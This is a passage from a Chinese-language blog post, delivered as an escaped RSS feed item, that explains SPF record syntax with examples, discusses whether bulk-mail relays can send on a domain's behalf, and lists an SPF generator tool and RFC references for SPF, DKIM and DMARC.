接受来自AnotherDomain.com的A记录，对Google.com的A记录保持中立，拒绝其他所有。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;v=spf1 exists:AnotherDomain.com -all&lt;/code&gt;&lt;br&gt;
如果AnotherDomain.com存在A记录则接受邮件，否则拒绝。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;v=spf1 -all&lt;/code&gt;&lt;br&gt;
拒绝来自本域的所有邮件，无论发送者是谁。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;v=spf1 include:mailgun.com include:sendgrid.com -all&lt;/code&gt;&lt;br&gt;
遵循mailgun.com和sendgrid.com的SPF记录规则，拒绝其他所有。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;v=spf1 redirect=AnotherDomain.com&lt;/code&gt;&lt;br&gt;
仅遵循AnotherDomain.com的SPF记录规则。&lt;/p&gt;
&lt;h2 id=&#34;再谈营销&#34;&gt;再谈营销
&lt;/h2&gt;&lt;p&gt;回到营销话题，MailChimp、MailGun和SendGrid在做什么？&lt;/p&gt;
&lt;p&gt;有趣的是，如果您使用邮件中继或群发邮件服务，邮件&lt;em&gt;可以&lt;/em&gt;被视为已授权，从而突破垃圾邮件箱。但作为红队成员，我不得不问&amp;hellip;&lt;/p&gt;
&lt;p&gt;第三方能否在我不知情的情况下，在我信任的第三方创建账户并以我的名义发送邮件？&lt;/p&gt;
&lt;p&gt;答案是&amp;hellip;既是也不是。&lt;/p&gt;
&lt;p&gt;这些服务可以在您配置SPF记录授权其邮件服务器后代表您发送邮件。它们会采取一些措施确保第三方不能使用您的FROM地址发送邮件，通常要求用户在代表某域名发送邮件前验证该域名。各服务验证方式不同，有些会在其域名上创建DNS记录（如&lt;code&gt;+a:yourdomain.mailrelayservice.com&lt;/code&gt;）以提供保证。但最终，您需要信任您的邮件服务器，如果无法信任&amp;hellip;这个世界很残酷，偏执可能会让您寸步难行。&lt;/p&gt;
&lt;h2 id=&#34;spf记录生成工具&#34;&gt;SPF记录生成工具
&lt;/h2&gt;&lt;p&gt;有些平台可帮助构建符合特定需求的SPF记录。大多数工具工作方式相似&amp;hellip;有些甚至收费！我不建议为创建SPF记录付费，但使用免费服务时务必小心。多年来，MXToolbox一直是我的系统管理员和蓝队工具箱中的利器，从未让我失望。&lt;/p&gt;
&lt;p&gt;在线构建SPF：https://mxtoolbox.com/SPFRecordGenerator.aspx&lt;/p&gt;
&lt;h2 id=&#34;相关链接&#34;&gt;相关链接
&lt;/h2&gt;&lt;p&gt;Open Sender Policy Framework：http://www.openspf.org/Project_Overview&lt;br&gt;
SPF V1: RFC 7208 (替代4408, 6652) &lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/rfc/rfc7208.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://tools.ietf.org/rfc/rfc7208.txt&lt;/a&gt;&lt;br&gt;
SPF V1: RFC 6652 (被RFC-7208替代) &lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc6652&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://tools.ietf.org/html/rfc6652&lt;/a&gt;&lt;br&gt;
SPF V1: RFC 4408 (被RFC-7208替代) (2006) &lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc4408&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://tools.ietf.org/html/rfc4408&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;即将发布的博客：DKIM, DMARC!&lt;/p&gt;
&lt;p&gt;基于域的消息认证、报告和一致性：https://dmarc.org/&lt;br&gt;
SPF V1: RFC 7960 – DMARC互操作性 &lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/rfc/rfc7960.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://tools.ietf.org/rfc/rfc7960.txt&lt;/a&gt;&lt;br&gt;
SPF V1: RFC 7489 – DMARC &lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/rfc/rfc7489.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://tools.ietf.org/rfc/rfc7489.txt&lt;/a&gt;&lt;br&gt;
SPF V1: RFC 7372 -DKIM (更新7208) &lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/rfc/rfc7372.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://tools.ietf.org/rfc/rfc7372.txt&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&amp;ldquo;但请相信我对防晒霜的建议。&amp;rdquo;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;*Kent和Derrick是我们的系统管理员团队成员——没有他们我们该怎么办？&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
